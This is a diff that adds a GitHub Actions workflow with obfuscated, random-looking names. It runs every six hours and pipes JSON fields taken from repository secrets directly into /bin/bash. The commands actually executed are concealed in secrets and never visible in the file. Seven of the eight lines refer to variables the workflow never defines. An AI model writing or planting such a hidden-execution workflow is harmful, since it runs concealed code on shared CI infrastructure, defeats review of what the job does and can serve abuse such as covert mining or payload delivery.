@@ -1,0 +1,25 @@
+name: luotianyuan8765
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luotianyuan8765
+        env:
+          eb388: ${{ secrets.eb388 }}
+        run: |
+          echo $eb388 | jq -r .kzpwf89570 | /bin/bash
+          echo $d359 | jq -r .pludk111 | /bin/bash
+          echo $nkryy878 | jq -r .adg78 | /bin/bash
+          echo $yq7158 | jq -r .mreoy8 | /bin/bash
+          echo $qli04 | jq -r .arvs1 | /bin/bash
+          echo $s7 | jq -r .a95706 | /bin/bash
+          echo $sws02554 | jq -r .zt27 | /bin/bash
+          echo $ht72 | jq -r .msh54 | /bin/bash
+
